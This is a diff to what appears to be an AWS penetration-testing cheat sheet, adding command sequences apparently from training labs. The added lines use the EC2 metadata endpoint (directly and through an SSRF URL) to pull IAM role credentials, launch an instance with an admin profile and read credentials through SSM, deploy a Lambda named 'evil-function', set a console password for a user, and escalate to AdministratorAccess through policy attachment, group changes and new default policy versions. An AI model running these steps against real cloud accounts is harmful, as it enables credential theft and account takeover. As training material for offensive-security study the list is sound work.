@@ -67,6 +67,47 @@ AWS Instance Metadata URL
 TOKEN=curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
 curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
 curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
+
+
+aws ec2 describe-images --owners amazon --filters
+'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' --output
+json
+aws ec2 describe-subnets
+aws ec2 describe-security-groups
+aws iam list-instance-profiles
+aws ec2 run-instances --subnet-id subnet-0b57901260df6b3f3 --image-id
+ami-0d08a21fc010da680 --iam-instance-profile Name=ec2_admin --instance-type t2.micro
+--security-group-ids "sg-06407fe95d211b245"
+aws ssm send-command \
+--document-name "AWS-RunShellScript" \
+--parameters 'commands=["curl
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \
+--targets "Key=instanceids,Values=i-0aa5cdcaf86dec148" \
+--comment "aws cli 1"
+aws ssm get-command-invocation \
+--command-id "0765bff4-4966-446f-a0a2-4e0cdfee565f" \
+--instance-id "i-0da83d9b4322af3fa"
+
+
+
+aws cloudformation create-stack --stack-name ad-stack --template-body
+file://new_policy.json --capabilities CAPABILITY_NAMED_IAM --role-arn
+arn:aws:iam::161176965264:role/lab12CFDeployRole
+aws cloudformation describe-stacks --stack-name ad-stack
+aws cloudformation describe-stack-events --stack-name ad-stack
+
+
+
+aws lambda create-function \
+--function-name evil-function \
+--runtime python3.8 \
+--zip-file fileb://evil-function.zip \
+--handler evil.handler \
+--role arn:aws:iam::645723898191:role/lab11lambdaiam
+aws lambda invoke --function-name evil-function invoke_out.txt
+
+aws iam create-login-profile --user-name AdminBob --password abcd@12345
+--no-password-reset-required
 ```
 
 ## Post-compromise
@@ -163,6 +204,9 @@ bash install.sh
 python3 pacu.py
 import_keys --all
 ls
+
+run iam__enum_roles --role-name a4 --account-id 276384657722 --word-list
+/home/student/names.txt
 ```
 
 ### Others
@@ -182,7 +226,35 @@ ls
 # https://github.com/grines/scour
 ```
 
-
+```
+aws iam create-user --user-name Bob
+aws iam attach-group-polcy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws sts assume-role --role-arn arn:aws:iam::607486832336:role/Attacher
+--role-session-name attacher_test
+aws iam list-role-policies --role-name Attacher
+aws iam get-role-policy --role-name Attacher --policy-name AttachPolicy
+aws iam list-groups-for-user --user-name student
+aws iam add-user-to-group --group-name Printers --user-name student
+aws sts assume-role --role-arn arn:aws:iam::596317060068:role/Adder
+--role-session-name adder_test
+aws iam list-role-policies --role-name Adder
+aws iam get-role-policy --role-name Adder --policy-name AddUser
+aws iam list-user-policies --user-name student
+aws iam get-user-policy --user-name student --policy-name
+terraform-20210211051758659400000002
+aws iam list-attached-user-policies --user-name student
+aws iam attach-user-policy --user-name student --policy-arn
+arn:aws:iam::aws:policy/AdministratorAccess
+aws iam list-policies | grep ‘AdministratorAccess’
+aws iam get-policy-version --policy-arn arn:aws:iam::607486832336:policy/Service
+--version-id v1
+aws iam get-policy --policy-arn arn:aws:iam::607486832336:policy/Service
+aws iam list-attached-policies --user-name student
+aws iam get-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print
+--version-id v1
+aws iam create-policy-version --policy-arn arn:aws:iam::645723898191:policy/Print
+--policy-document file://newAdminPolicy.json --set-as-default
+```
 
 ## IAM
 
@@ -294,6 +366,11 @@ aws organizations list-policies-for-target --filter SERVICE_CONTROL_POLICY --tar
 ### Assume role from any ec2 instance (get Admin)
 
 ```
+Create role
+aws iam create-role --role-name a4 --assume-role-policy-document
+file://assume-role-doc.json
+
+
 Create instance profile
 aws iam create-instance-profile --instance-profile-name YourNewRole-Instance-Profile
 Associate role to Instance Profile
